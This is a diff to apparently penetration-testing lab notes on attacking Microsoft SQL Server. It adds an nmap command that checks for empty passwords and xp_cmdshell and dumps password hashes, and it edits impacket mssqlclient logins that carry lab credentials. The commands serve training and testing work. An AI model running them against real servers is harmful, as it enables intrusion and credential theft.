@@ -10,6 +10,8 @@
 # Comprehensive Scan
 # ⚠️ OPSEC: High Noise.
 nmap -p 1433 -sV -sC --script "ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess" 10.129.20.13
+# OR
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
 ```
 ### Metasploit (Ping)
 **Description:** Finds hidden instances or non-standard ports via UDP broadcast.
@@ -43,8 +45,8 @@ impacket-mssqlclient sa:Password123@10.129.20.13
 # -windows-auth: Forces Kerberos/NTLM authentication
 impacket-mssqlclient INLANEFREIGHT/julio:Password123@10.129.20.13 -windows-auth
 
-# Syntax: mssqlclient.py <Domain>/<User>:<Pass>@<Target_IP> -windows-auth
-mssqlclient.py INLANEFREIGHT/DAMUNDSEN:SQL1234!@172.16.5.150 -windows-auth
+# Syntax: python3 mssqlclient.py <Domain>/<User>:<Pass>@<Target_IP> -windows-auth
+python3 mssqlclient.py INLANEFREIGHT/DAMUNDSEN:SQL1234!@172.16.5.150 -windows-auth
 ```
 ### Linux CLI (`sqsh`)
 **Description:** Legacy tool, behaves like a standard shell. 
